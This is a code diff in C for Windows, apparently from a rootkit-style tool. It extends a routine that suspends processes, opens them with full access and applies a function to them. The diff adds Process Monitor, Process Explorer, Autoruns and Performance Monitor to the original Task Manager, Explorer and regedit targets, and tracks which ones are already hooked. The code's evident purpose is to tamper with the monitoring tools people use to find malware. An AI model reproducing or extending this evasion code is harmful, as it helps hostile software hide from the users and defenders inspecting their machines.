@@ -4,6 +4,29 @@
 
 // GLOBALS
 DWORD dwGKPID;
+BOOL taskHooked = false;
+BOOL explorerHooked = false;
+BOOL perfHooked = false;
+BOOL procHooked = false;
+BOOL procexpHooked = false;
+BOOL autoHooked = false;
+
+BOOL IsProcessRunning(const char *processName)
+{
+    BOOL exists = false;
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+    if (Process32First(snapshot, &entry))
+        while (Process32Next(snapshot, &entry))
+            if (!stricmp(entry.szExeFile, processName))
+                exists = true;
+
+    CloseHandle(snapshot);
+    return exists;
+}
 
 BOOL process_allSuspendApplyResume(APPLY aFunc) {
     HANDLE hSnapP;
@@ -22,21 +45,54 @@ BOOL process_allSuspendApplyResume(APPLY aFunc) {
     dwGKPID = GetCurrentProcessId();
     while (TRUE) {
 		DWORD dwPID = pe32.th32ProcessID;
-		if (dwGKPID != dwPID && dwPID != 0) { // Lets not suspend ourself
-			if (stricmp(pe32.szExeFile, "taskmgr.exe") == 0
-				|| stricmp(pe32.szExeFile, "explorer.exe") == 0
-				|| stricmp(pe32.szExeFile, "regedit.exe") == 0) {
-				if (TRUE == process_suspendOrResumeAllThreads(dwPID, TRUE)) {
-					HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+        if (!IsProcessRunning("taskmgr.exe"))
+            taskHooked = false;
+        if (!IsProcessRunning("explorer.exe"))
+            explorerHooked = false;
+        if (!IsProcessRunning("perfmon.exe"))
+            perfHooked = false;
+        if (!IsProcessRunning("Procmon.exe"))
+            procHooked = false;
+        if (!IsProcessRunning("procexp.exe"))
+            procexpHooked = false;
+        if (!IsProcessRunning("Autoruns.exe"))
+            autoHooked = false;
 
-					if (NULL != hP) {
-						if (NULL != aFunc) // For debugging purpose only TODO remove
-							aFunc(hP);
-						CloseHandle(hP);
-						process_suspendOrResumeAllThreads(dwPID, FALSE);
-					}
-				}
-			}
+		if (dwGKPID != dwPID && dwPID != 0)
+        {
+			if (!taskHooked && (stricmp(pe32.szExeFile, "taskmgr.exe") == 0)
+                || (!procexpHooked && stricmp(pe32.szExeFile, "procexp.exe") == 0)
+                || (!perfHooked && stricmp(pe32.szExeFile, "perfmon.exe") == 0)
+                || (!procHooked && stricmp(pe32.szExeFile, "Procmon.exe") == 0)
+                || (!autoHooked && stricmp(pe32.szExeFile, "Autoruns.exe") == 0)
+				|| (!explorerHooked && stricmp(pe32.szExeFile, "explorer.exe") == 0))
+				 {
+                if (stricmp(pe32.szExeFile, "taskmgr.exe") == 0)
+                     taskHooked = true;
+                else if (stricmp(pe32.szExeFile, "explorer.exe") == 0)
+                    explorerHooked = true;
+                else if (stricmp(pe32.szExeFile, "perfmon.exe") == 0)
+                    perfHooked = true;
+                else if (stricmp(pe32.szExeFile, "Procmon.exe") == 0)
+                    procHooked = true;
+                else if (stricmp(pe32.szExeFile, "procexp.exe") == 0)
+                    procexpHooked = true;
+                else
+                    autoHooked = true;
+
+				    if (TRUE == process_suspendOrResumeAllThreads(dwPID, TRUE))
+                    {
+					    HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+
+					    if (NULL != hP)
+                        {
+						    if (NULL != aFunc) // For debugging purpose only TODO remove
+							    aFunc(hP);
+						    CloseHandle(hP);
+						    process_suspendOrResumeAllThreads(dwPID, FALSE);
+					    }
+				    }
+			    }
 		}
 
 		if (FALSE == (Process32Next(hSnapP, &pe32)))
